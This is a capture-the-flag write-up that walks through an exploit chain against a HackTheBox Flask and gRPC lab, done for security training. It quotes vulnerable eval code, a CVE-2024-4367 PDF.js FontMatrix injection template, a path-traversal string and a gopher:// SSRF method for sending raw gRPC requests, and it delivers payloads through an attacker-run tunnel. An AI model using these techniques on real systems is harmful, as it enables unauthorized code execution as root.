# ArtificialUniversity — SOLVED (self-solved, white-box)

- Platform: HackTheBox (web). Flask store + a private gRPC product API, one container.
- Date: 2026-09-23
- Target: `http://154.57.164.82:31513`
- Flag: redacted; read over HTTP from the app's own static directory
- No writeup used. Source was supplied and every step was confirmed live.

## The bug at the end of the chain

`src/product_api/api.py`:

```python
def UpdateService(self, source, destination):
    for key, value in source.items():
        ...
        elif hasattr(destination, "__dict__"):
            destination.__dict__[key] = value     # writes any attribute

def DebugService(self, request, context):
    input_dict = {k: v.string_value for k, v in request.input.items()}
    self.UpdateService(input_dict, self)          # destination IS the servicer

def GenerateProduct(self):
    if hasattr(self, "price_formula"):
        price = eval(self.price_formula)          # runs as root
```

One `DebugService` call sets `price_formula` on the servicer, and every later
`GetNewProducts` — reachable as admin at `/admin/product-stream` — `eval()`s it.
supervisord runs both services as `user=root`.

The catch: the gRPC server binds `[::]:50051`, only port 1337 is exposed, and
the store's `ProductClient` never calls `DebugService`. So the whole rest of the
chain exists to get one gRPC request sent from inside the container.

## Getting there

**1. The bot runs on demand, and its destination is attacker-controlled.**
`payments.py` `get_amount_paid()` is a stub that always returns `0`, and
`routes.py` runs the bot when `amt_paid >= order.price`. The "external order"
branch of `/checkout` takes `price` from the query string and needs no login, so
an order with `price=0` satisfies the comparison. Then:

```python
bot_runner(ADMIN_EMAIL, ADMIN_PASS, payment_id)     # payment_id from request.args
client.get(f"http://127.0.0.1:1337/static/invoices/invoice_{payment_id}.pdf")
```

`invoice_` is glued to the front, so `invoice_..` is a literal segment and not a
traversal. Starting the value with `/` detaches it:

```
/static/invoices/invoice_ + /../../../admin/view-pdf?url=...&z=
  -> /static/invoices/invoice_/../../../admin/view-pdf?...  -> /admin/view-pdf?...
```

`generate_invoice()` needs a real user row, so the order must carry an existing
`user_id`.

**2. `/admin/view-pdf` turns our bytes into a same-origin PDF.** It fetches any
URL server-side, requires `Content-Type: application/pdf`, and re-serves the
body from the app's own origin.

**3. CVE-2024-4367 (PDF.js), because the Dockerfile pins Firefox 125.0.1.**
PDF.js before Firefox 126 interpolates a font's `/FontMatrix` into JavaScript it
builds with `new Function`, so a FontMatrix entry that is a PDF *string* escapes:

```
/FontMatrix [1 0 0 1 0 (1\); <js>; //)]
   -> ctx.transform(1,0,0,1,0,1); <js>; //);
```

**This did not fire until the embedded font's own FontMatrix was blanked.**
PDF.js reads FontMatrix from the font dictionary, but `Type1Parser` then
overwrites `properties.fontMatrix` with whatever the embedded program declares.
The tex-gyre `.pfb` used here ships `/FontMatrix[0.001 0 0 0.001 0 0]`, which
silently replaced the payload. Blanking it in place — same byte length so
`/Length1` stays valid — leaves the dictionary value as the only one PDF.js sees.

**4. Navigations carry the admin session; subresources do not.** With JS running
and `location.origin == http://127.0.0.1:1337`, every `fetch` at the app still
returned `TypeError: NetworkError`, while `fetch` at our own host (which sends
`Access-Control-Allow-Origin: *`) worked. Firing `img`, `script`, `iframe`,
`sendBeacon` and `XMLHttpRequest` at our host proved the vectors themselves were
fine, and the same requests aimed at the app produced no server-side effect at
all. A **top-level navigation** to `/admin/view-pdf?url=<our host>` did make the
app fetch our URL, which is the proof that navigations keep the cookie.

`/admin/api-health` only takes the URL by POST, so the payload builds a form and
submits it — a form submission is a navigation.

**5. gRPC over gopher.** `/admin/api-health` passes the URL straight to
`curl -o /dev/null -w "%{http_code}"`. `gopher://127.0.0.1:50051/_<bytes>` makes
curl write one HTTP/2 request: client preface, SETTINGS, HEADERS (HPACK literal,
no Huffman), DATA with `END_STREAM` carrying the gRPC frame. The response is
never read — the handler runs anyway. The protobuf was hand-encoded (a proto3
map entry is a message with key = field 1, value = field 2) so nothing depends
on a matching protobuf runtime.

**6. Output.** `eval` writes the flag into the app's own static directory, which
is then fetched over plain HTTP. No exfiltration channel is needed for the flag
itself — only for delivering the PDF.

Two bot visits total: one to set `price_formula`, one plain admin navigation to
`/admin/product-stream` to make `GenerateProduct` run it.

## Traps

- The embedded font's own `/FontMatrix` overrides the dictionary one. This fails
  completely silently — the PDF renders, the JS never runs.
- Relative URLs inside the PDF.js context resolve against the viewer's internal
  base, not the document URL. Use absolute URLs.
- `int(result.stdout)` in `curl.py` raises `ValueError` on non-numeric output,
  and `app.py`'s global handler returns `str(e.args)` — so curl's stdout leaks in
  the response body. Useful as a read channel; not needed here.
- The flag file is renamed to `/flag<10 hex>.txt` at container start, so the
  command must glob rather than name it.
- localhost.run hands out a new random subdomain on every reconnect and drops
  every few minutes. Two runs looked like exploit failures when the app had
  simply fetched a dead host. Rebuild the PDF per request from the current
  hostname and keep the tunnel under a restart loop.

## Cleanup performed

`/static/f.txt` was removed (confirmed 404) and `price_formula` was replaced with
an idempotent expression that evaluates to `1.0`, so `GenerateProduct` keeps
working. The attribute cannot be deleted through the merge, only overwritten.

## Reusable lessons

- **A recursive merge whose destination is `self` is attribute pollution, and it
  is worth more than prototype pollution when a nearby method `eval`s one of the
  attributes it can set.** Look for the pair, not just the merge.
- **When a browser-side payload can run but every request to the app dies, test
  the vector and the credential separately.** Pointing each vector at a server
  you control separates "blocked" from "arrived without the session", and that
  distinction is what pointed at navigations here.
- **gopher + curl is enough to speak HTTP/2 one-way.** gRPC never has to answer
  for the handler to execute, so the whole response path can be ignored.
- **Prefer the app's own static directory as the flag channel.** It removes the
  exfiltration host from the critical path entirely; the tunnel is then only
  needed for the payload delivery, which is far more tolerant of failure.
